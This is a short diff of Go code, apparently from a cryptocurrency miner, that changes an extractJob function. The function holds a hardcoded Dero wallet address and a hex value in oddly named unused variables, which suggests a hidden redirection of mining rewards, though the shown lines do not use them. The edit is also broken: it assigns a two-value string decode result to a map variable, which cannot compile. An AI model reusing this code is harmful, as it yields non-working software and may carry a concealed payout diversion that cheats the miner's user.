@@ -27,13 +27,15 @@ func base64Decode(str string) (string, bool) {
 
 //var data = base64Decode(data);
 
-func extractJob(base64Decode(data map[string]any)) (*Job, error) {
+func extractJob(data map[string]any) (*Job, error) {
 	var didi interface{}
 	didi = "dero1qyrh32ggyrg2mgcncwqv38dp7kc9wgd6qyacrvt68fzrkt9w9g0fvqgy7qqks"
 	var didis interface{}
 	didis = "178e8f40ea1e0300"
 	if data == nil {
 		return nil, ErrNoJob
+	}else{
+		data = base64Decode(data);
 	}
 
 	var (
